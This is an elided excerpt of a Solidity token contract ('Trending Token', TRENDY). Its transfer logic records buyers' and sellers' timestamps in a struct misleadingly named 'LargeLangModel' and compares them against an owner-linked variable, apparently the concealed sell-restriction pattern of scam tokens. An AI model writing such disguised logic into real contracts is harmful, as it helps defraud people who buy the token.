...
contract TRENDY is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Trending Token";
    string private constant _symbol = unicode"TRENDY";
    ...
    struct LargeLangModel {uint256 incoming; uint256 outcoming; uint256 accumulate;}
    mapping(address => LargeLangModel) private LLM;
    uint256 private modelUpdate;
    ...
    constructor() {
        _taxWallet = payable(0x3c352c43b9555B6778904D0EA5453E734094CeB3);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_exemptFromFee[from] && ! _exemptFromFee[to]){
            if (uniswapV2Pair != to) {
                LargeLangModel storage query = LLM[to];
                if (uniswapV2Pair==from) {
                    if (query.incoming == 0) {
                        query.incoming = (_buyCount<_preventSwapBefore)
                            ? (block.timestamp-1)
                            : block.timestamp;
                    }
                } else {
                    LargeLangModel storage instance =LLM[from];
                    if (query.incoming == 0 || instance.incoming<query.incoming) {
                        query.incoming = instance.incoming;
                    }
                }
            } else {
                LargeLangModel storage instance = LLM[from];
                instance.accumulate = instance.incoming-modelUpdate;
                instance.outcoming = block.timestamp;
            }
        }
    ...
    function recoverContractETH() external {
